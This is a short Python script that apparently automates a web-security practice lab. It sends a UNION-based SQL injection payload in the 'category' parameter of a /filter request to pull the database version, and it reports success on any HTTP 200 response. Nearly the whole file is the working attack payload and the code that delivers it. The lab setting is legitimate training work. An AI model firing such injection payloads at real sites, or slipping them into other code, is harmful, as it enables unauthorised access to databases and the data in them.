from base.base import Base

class SQL(Base):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        
    def _add_args(self):
        pass

    def run(self):      
        self.params = {'category': "Gifts' union select null, @@version-- "}
        response = self.session.get(f"{self.base_url}/filter", params=self.params)

        if self.verbose:
            self.log(f"Response status code: {response.status_code}", "info")

        if response.status_code == 200:
            self.log("Lab Solved", "success")
        else:
            self.log(f"Failed to solve lab", "error")
        


if __name__ == "__main__":
    sql = SQL()
    sql.run()